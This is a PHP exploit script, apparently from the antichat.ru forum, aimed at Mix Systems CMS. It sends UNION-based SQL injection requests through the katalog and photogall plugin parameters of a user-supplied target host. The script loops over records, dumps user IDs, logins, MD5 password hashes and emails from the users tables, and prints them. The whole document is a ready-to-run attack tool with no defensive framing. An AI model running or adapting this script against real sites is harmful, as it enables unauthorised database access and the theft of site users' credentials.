&lt;?
echo &quot;\n&quot;;
echo &quot;-------------------------Mix Systems CMS--------------------------&quot;.&quot;\n&quot;;
echo &quot;-----------------------coded by : halkfild------------------------&quot;.&quot;\n&quot;;
echo &quot;----------------------------antichat.ru------------------------&quot;.&quot;\n&quot;;

if ($argc!=4){
echo &quot; Usage: php &quot;.$argv[0].&quot; host type num_records\n&quot;;
echo &quot; host: Your target ex www.target.com \n&quot;;
echo &quot; type: 1 - plugin=katalog bug\n&quot;;
echo &quot; 2 - plugin=photogall bug\n&quot;;
echo &quot; num_records: number or returned records(if 0 - return all)\n&quot;;
echo &quot; example: php script.php site.com 10\n&quot;;
echo &quot;\n&quot;;
exit;
}

$host=$argv[1];
$type=$argv[2];
$count=$argv[3];

if ($argv[2]==1) {
$query=&quot;index.php?plugin=katalog&amp;do=showUserContent&amp;type=tovars&amp;id=-395&#039;+union+select+1,2,3,4,5,concat_ws(0x3a3a,CHAR(64),id,login,pwd,email,CHAR(64)),7,8,9,10,11,12,13,14,15,16,17,18+from+mix_users+limit+&quot;;
$end=&quot;,1/*&quot;;
}
elseif ($argv[2]==2) {
$query=&quot;index.php?plugin=photogall&amp;do=exposure&amp;path=product&amp;parent=49&#039;+union+select+1,2,3,concat_ws(0x3a3a,CHAR(64),id,login,pwd,email,CHAR(64)),5,6,7,8,9,10,11,12+from+ng_users+limit+&quot;;
$end=&quot;,1/*&amp;cat=11&quot;;
}
else {
echo &quot; incorrect parameter #2=&quot;.$argv[2].&quot;\n&quot;;
echo &quot; type: 1 - plugin=katalog bug\n&quot;;
echo &quot; 2 - plugin=photogall bug\n&quot;;
exit;
}
$site=$host.&#039;/&#039;.$query;
$pattern=&#039;/@::(\d+)::(.*)::([0-9a-z]{32})::(.*@.*)::@/&#039;;
$i=0;
if(function_exists(&#039;curl_init&#039;))
{
while(1) {
$ch = curl_init(&quot;http://&quot;.$site.$i.$end);
curl_setopt($ch, CURLOPT_HEADER,true);
curl_setopt( $ch, CURLOPT_RETURNTRANSFER,true);
curl_setopt($ch, CURLOPT_TIMEOUT,10);
curl_setopt($ch, CURLOPT_USERAGENT, &quot;Mozilla/4.0 (compatible; MSIE 6.0;Windows NT 5.1)&quot;);
$res=curl_exec($ch);
$returncode = curl_getinfo($ch,CURLINFO_HTTP_CODE);
curl_close($ch);
if ($returncode==404) exit (&quot;Vulnerable script not found. Check your site and settings :| \n&quot;);
if(preg_match_all($pattern,$res,$out)) {
echo &quot;| &quot;.$out[1][0].&quot; | &quot;.$out[2][0].&quot; | &quot;.$out[3][0].&quot; | &quot;.$out[4][0].&quot; |\r\n&quot;;
$i++;
$out=null;
}
else break;
if ($count!=0 &amp;&amp; $i&gt;$count) break;
}
echo (&quot;Finish. /* &quot;.$i.&quot; records*/ \n&quot;);
}
else
exit(&quot;Error:Libcurl isnt installed \n&quot;);

?&gt;
